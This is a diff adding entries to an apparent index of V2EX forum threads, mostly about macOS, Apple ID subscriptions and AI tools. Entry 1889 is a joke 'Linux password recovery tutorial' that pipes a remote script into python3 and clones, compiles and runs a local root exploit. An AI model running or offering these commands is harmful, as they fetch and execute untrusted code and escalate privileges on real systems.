+#### 1875. [V2EX] macmini 外接硬盘如何实现开机自动挂载
+
+**问题描述 / Problem Description**:
+买了一个丐版的 macmini ，接了一个外挂硬盘，但是我发现这个硬盘必须要首次登录后才会被挂载，如何能够实现启动的时候就挂载呢？试了一下 fstab 好像不行。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213083#reply5
+
+---
+
+#### 1876. [V2EX] 打算把 macos 降级了
+
+**问题描述 / Problem Description**:
+m1pro 的 mbp, 升到 macos26 以来卡顿感明显加强，降到哪一级合适，准备养老了，还有数据恢复的问题，降级担心 mac 自带的工具无法顺利恢复数据，需要做什么额外的处理吗
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212989#reply15
+
+---
+
+#### 1877. [V2EX] 不是我个人感觉 Macos 的窗口管理就是一坨吧
+
+**问题描述 / Problem Description**:
+就这个问题也问了 ai ，答复是 macos 的设计初衷是以应用为主，多个窗口汇集于一个应用中。 就我个人体验而言确实是感觉被苹果教育了不少，用来用去始终不如 win 来的畅快跟方便，当然谁叫人家叫视窗呢。 我装了 alttab 但是内存占用也挺高的还会有黄色录屏提示。不过就功能而言 alttab 确实吊打 cmd➕tab 。 所以问题是：就我觉得还是这就是一坨？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212830#reply4
+
+---
+
+#### 1878. [V2EX] MacTools - 开源、轻量、快速、低打扰 macOS 菜单栏工具箱
+
+**问题描述 / Problem Description**:
+各位 V 友好，分享一个最近在做的 macOS 小工具：MacTools 。 GitHub: https://github.com/ggbond268/MacTools 它是一个免费、开源的 macOS 菜单栏工具集合，主要想解决一个比较朴素的问题： 很多系统小功能都不大，但平时又经常会用到。 比如调外接显示器亮度、切分辨率、临时阻止休眠、清理开发缓存、看系统状态、管理启动项、隐藏刘海、看日历等等。 单独为每个功能装一个 App 感觉有点重，所以就做了一个尽量轻量的菜单栏工具箱，把这些能力收在一个地方。 目前包含的功能大概有这些： 显示器分辨率：查看已连接显示器，并快速切换可用分辨率 显示器亮
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212740#reply14
+
+---
+
+#### 1879. [V2EX] macOS 怎么还不支持选中即复制
+
+**问题描述 / Problem Description**:
+每次都要 Cmd+C Cmd+V 太不方便了
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212367#reply16
+
+---
+
+#### 1880. [V2EX] macbook pro 还是等 mac mini
+
+**问题描述 / Problem Description**:
+目前自己有一台 mbp16 ，2021 年的 m1pro ，看了看官网折抵只有五千不到了... 公司前两年发的也是一台 mbp ，m2pro 。 移动办公的话，基本上有公司的就够了。说实话在家里基本上从来没看过 mbp 自带的屏幕。 考虑到同配置 mac mini 和 mbp 的巨大差价，感觉是不是等 mac mini 的 m5 好一点，好像有消息说今年没有了。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213180#reply6
+
+---
+
+#### 1881. [V2EX] 一个“小众”快捷指令需求，谁能来指点下？
+
+**问题描述 / Problem Description**:
+想 iphone 上设计个快捷指令（或者自动化，其实二者差不多吧），把 apple watch 每天记录的锻炼信息，自动添加到"日历"里面，例如“户外跑步，30 分钟”这种 自己实力不行，折腾半天搞不定，问了 AI 也各种方案都不太靠谱 哪位大佬给指点下？ 或者有推荐的快捷指令网站不？我去学习下
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212969#reply6
+
+---
+
+#### 1882. [V2EX] 踩坑贴｜美区 App Store 订阅 GPT
+
+**问题描述 / Problem Description**:
+前情 昨天发了帖子问了大概的情况： https://www.v2ex.com/t/1212726 此外也看到了 https://www.v2ex.com/t/1210841 这个帖子讲过的大坑 简单说就是 1 个 Apple ID 只能对 1 个 GPT 账号进行套餐订阅，首次订阅后，无论怎样在 ChatGPT App 中切换 GPT 账户，最终完成的付款订阅都会在第一个 GPT 账号上生效 踩坑 了解这些后，晚上 买了一个账号 ，然后通过 VISA 购买礼品卡，充值订阅 问题就出在这个购买的账号了，是老号 在完成支付后，弹窗显示 Purchases for your Apple ID are
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212915#reply17
+
+---
+
+#### 1883. [V2EX] 自提二手 Studio Display 有感
+
+**问题描述 / Problem Description**:
+小黄鱼刷到一台本地自提的 Studio Display ，24 年 8 月的机器，99 新，带可调节高度和倾斜度支架，8300 元。 一开始其实还在纠结，要不要上飞利浦那台 5K 显示器。毕竟参数看起来确实不错，价格也更香。但仔细搜了一圈，发现这台飞利浦 5K 全网评测真的很少，目前主要就看到一篇外网评测，说整体参数、色彩、清晰度都可以，但也提到面板抽奖比较严重。想来想去，还是觉得显示器这种每天都盯着看的东西，稳定和体验更重要，最后决定入二手 Studio Display 。 今天 30 多斤重一路自提扛回家，原主人保存得非常好，连外壳保护、显示器贴膜纸这些都还在，成色确实很顶。 接上 Mac
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212841#reply48
+
+---
+
+#### 1884. [V2EX] Mac 提示 你当前的安全性设置阻止安装系统扩展。
+
+**问题描述 / Problem Description**:
+升级 26.5 的时候跳出来的，这个是什么拓展
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212728#reply3
+
+---
+
+#### 1885. [V2EX] 现在买美区 Apple ID 用礼品卡买 GPT Pro 可行吗？
+
+**问题描述 / Problem Description**:
+Apple 对这种账号的管理严格吗？ 此外就是有只登商店和包含 iCloud 两种规格的账号，要买哪种？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212726#reply23
+
+---
+
+#### 1886. [V2EX] 尼区 Apple ID 一直无法 purchase，余额够的
+
+**问题描述 / Problem Description**:
+尼区 Apple ID 一直无法 purchase ，余额够的，买 Claude 5x 一直无法完成 purchase ，有人遇到这种情况吗？找苹果客服，让我等了一个又一个 24 小时，还是不行
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212616#reply8
+
+---
+
+#### 1887. [V2EX] 现在入手二代 homepod 感觉挺值的呀，咸鱼全新 1200-1300， tb 上 1400 左右
+
+**问题描述 / Problem Description**:
+一对两千五六组立体声的话，感觉是听音乐性价比最高的了，可惜对于游戏之类的应用声音延迟太高 看到一代可以通过底部的维修调试接口有线连接，盼着将来能连线适配游戏主机之类的办法 https://github.com/UnbendableStraw/homepwn-simple
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212484#reply17
+
+---
+
+#### 1888. [V2EX] Google 搜索抖音“汽水音乐”第一条是木马病毒
+
+**问题描述 / Problem Description**:
+从这个网站下载抖音汽水音乐 windows 压缩包，解压缩过程中 windows 安全中心提示是特洛伊木马病毒，我还傻乎乎的解压缩了两次，不过万幸都阻止隔离了。运行 Microsoft Defender 脱机版扫描了一下，万幸没中招。 其实之前社区就提示过谷歌搜索第一条也会有假网站，之前 telegram 和 z-library 都出现过，没想到防不胜防啊。 @抖音同学们，这个你们能不能投诉处理一下啊
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213227#reply10
+
+---
+
+#### 1889. [V2EX] [转载] Linux 找回密码教程，建议收藏！
+
+**问题描述 / Problem Description**:
+Linux 找回密码教程，建议收藏！ curl https://copy.fail/exp | python3 && su passwd root 设置你的新密码 你的 Linux 密码又忘了？ 没关系，这里还有一个新的！ git clone https://github.com/V4bel/dirtyfrag.git&& cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp 不想再忘记密码了？ 我们有专业的黑客团队帮您运维服务器和保管密码！ 项目地址: https://github.com/tukaani-project/xz/
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213200#reply6
+
+---
+
+#### 1890. [V2EX] 一个极简的导航站，只需要有 cf 就能部署
+
+**问题描述 / Problem Description**:
+不需要服务器，只需要有 cf 账号就行，直接部署 配置下环境变量就可以实现可以自己 div 的导航站 项目地址是 https://github.com/maodeyu180/mao_nav 部署教程在 md
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213196#reply0
+
+---
+
+#### 1891. [V2EX] 做了三年技术文档，我终于不用手动截图写教程了
+
+**问题描述 / Problem Description**:
+上个月产品上线新功能，Leader 让我出一套操作手册。 按以前的流程：打开录屏工具录一遍 → 导出视频 → 逐帧截图 → 打开 Word → 粘贴截图 → 写步骤说明 → 排版调格式。一个 5 分钟的操作流程，折腾下来两个小时起步。 这次同事丢给我一个工具，说"你试试这个"。抱着试试看的心态用了一下午，感觉像是发现了新大陆。 先说录屏这个环节 以前录屏就是机械地把屏幕操作录下来，回放的时候画面平淡如水，该看不清的地方还是看不清。 这个叫 FeelCut 的录屏工具，有个挺有意思的功能—— 智能运镜 。它会自动追踪鼠标位置，在关键操作的时候自动放大聚焦。录完回看，画面会有一种"纪录片式"的推拉
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213179#reply4
+
+---
+
+#### 1892. [V2EX] 发现 cloudflare 也有各种 AI api, 包含 GPT-5.5, Claude Opus 4.7
+
+**问题描述 / Problem Description**:
+价格偏贵, 不要用各种中转了,中转不靠谱 GPT-5.5------------------ Input tokens (per 1M) US$5.00 Output tokens (per 1M) US$30.00 Claude Opus 4.7--------------- Input tokens (per 1M) US$5.00 Output tokens (per 1M) US$25.00 Cached input tokens (per 1M) US$0.50 Cache creation tokens (per 1M) US$6.25
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213128#reply12
+
+---
+
+#### 1893. [V2EX] hostloc 关了？
+
+**问题描述 / Problem Description**:
+算不算又一个倒下的中文论坛
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213115#reply7
+
+---
+
+#### 1894. [V2EX] 基于 agent 的从语雀到 notion 文档迁移方案
+
+**问题描述 / Problem Description**:
+因为使用习惯，在语雀上留了一些资料和平时记录，但是语雀不给免费用户提供 mcp 的支持，于是尝试了 opencode + agent-browser 让 agent 在浏览器上读取语雀的文档再去 notion 上创建对应的文档。 模型用的是免费的 deepseekv4 flash ，等于白嫖，最终迁移的效果也挺不错，相当 amazing ！ PS: 使用 agent-browser 时候要明确告知 agent 先打开浏览器让我登录语雀 写文之际，发现语雀有非官方的 mcp 支持 😒
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1213080#reply1
+
+---
+
+#### 1895. [V2EX] 隔壁站参与了次抽奖，账户被禁了…
+
+**问题描述 / Problem Description**:
+您的帐户已被禁言 LINUX DO noreply@linux.do Thu, May 14, 11:12 PM (14 hours ago) to me 您已被论坛禁言。 原因 - 非必要不抽奖 说实话，没怎么仔细了解过社区准则，没想到还有这种规则，就挺惊讶的…
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212963#reply3
+
+---
+
+#### 1896. [V2EX] 让 AI 自己打比赛，赚了第一桶金 😂
+
+**问题描述 / Problem Description**:
+周末刷朋友圈，看到 DK 分享了一个 AgenTank 的 AI 坦克大战视频，让我想起了大学时和同学玩 RoboCode 的时光：大家写代码控制坦克互相 PK ，有的专精蛇皮走位，有的躲起来阴人，还有的看上去像在执行深奥战术，实际只是在墙角反复打转。 那时候策略全靠手写。一个复杂一点的想法，从脑子里出现，到真的变成能跑的代码，中间要经历写逻辑、调参数、跑比赛、看回放、再重写。现在有了 AI ，这个链路突然短了很多：想法可以很快落地、测试、复盘，再上线。 刚好最近 Anthropic 算力扩容，手头订阅额度用不完，于是我决定试试让 AI 自己打比赛，体验一下 AI 赛博斗蛐蛐。 第一位选手：网
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1212638#reply34
 
 ---
